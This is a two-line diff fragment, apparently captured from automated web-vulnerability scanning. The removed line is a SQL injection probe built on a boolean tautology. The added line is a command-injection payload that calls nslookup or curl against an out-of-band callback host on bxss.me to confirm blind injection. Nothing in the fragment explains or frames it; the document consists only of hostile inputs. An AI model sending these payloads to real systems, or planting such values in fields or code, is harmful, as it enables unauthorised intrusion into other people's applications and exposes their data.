@@ -1,1 +1,1 @@
--1' OR 2+713-713-1=0+0+0+1 or 'we28oFSb'='
+(nslookup -q=cname hitjvlblgbzum18323.bxss.me||curl hitjvlblgbzum18323.bxss.me))
